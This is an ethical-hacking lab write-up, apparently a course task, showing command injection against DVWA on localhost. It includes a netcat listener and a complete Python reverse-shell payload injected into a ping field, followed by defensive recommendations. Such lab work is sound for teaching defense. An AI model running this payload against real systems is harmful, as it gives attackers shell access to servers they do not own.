# Task 4: Using a Reverse Shell for Hacking (Ethical Demo)

## Environment
- Attacker: Kali Linux (`127.0.0.1`)
- Victim: DVWA v1.10 (localhost)
- Vulnerability: Command Injection (Security Level: Low)

## Steps Performed
1. Started listener: `nc -nvlp 4444`
2. In DVWA → Command Injection → injected payload:
   ```
   127.0.0.1; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
   ```
3. Got reverse shell as www-data
4. Verified with: whoami, id, pwd

## Security Recommendations
1. Input validation: Block ;, |, &, $()
2. Avoid system() in PHP — use safe APIs
3. Run web apps with least privileges
4. Deploy WAF + monitor outbound connections

## Key Takeaways
1. Command Injection → full system access possible
2. Reverse shells bypass firewall rules
3. Ethical testing on localhost = safe & valid

# Note: All tests performed on localhost. DVWA is not exposed to the internet.
